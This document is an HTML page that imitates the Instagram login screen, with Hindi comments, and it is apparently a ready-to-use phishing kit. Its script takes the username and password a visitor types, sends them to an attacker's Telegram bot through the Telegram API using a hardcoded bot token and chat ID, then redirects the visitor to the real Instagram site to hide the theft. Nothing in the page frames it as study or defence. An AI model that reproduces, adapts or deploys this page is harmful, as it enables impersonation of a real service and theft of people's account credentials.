<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-wrapper {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-container img {
            width: 175px;
            height: 51px;
            object-fit: contain;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 8px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1877f2;
        }
        .or-divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
        }
        .or-divider::before, .or-divider::after {
            content: "";
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-divider::before { margin-right: 18px; }
        .or-divider::after { margin-left: 18px; }

        .fb-login {
            text-align: center;
            margin-bottom: 20px;
        }
        .fb-login a {
            text-decoration: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
        }
        .signup-section {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            border-top: 1px solid #dbdbdb;
            padding-top: 15px;
            color: #737373;
        }
        .signup-section a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="login-wrapper">
        <!-- असली Instagram लोगो -->
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram">
        </div>

        <!-- लॉगिन फॉर्म -->
        <form id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="or-divider">OR</div>

        <div class="fb-login">
            <a href="#">Log in with Facebook</a>
        </div>
    </div>

    <div class="signup-section">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <!-- टेलीग्राम पर डेटा भेजने की स्क्रिप्ट -->
    <script>
        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
        const chatId = "7008289410";    

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            let user = document.querySelector('input[name="username"]').value;
            let pass = document.querySelector('input[name="password"]').value;

            let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                console.log('सफलतापूर्वक भेज दिया गया', data);
                window.location.href = "https://instagram.com"; 
            })
            .catch(error => console.error('एरर:', error));
        });
    </script>

</body>
</html>
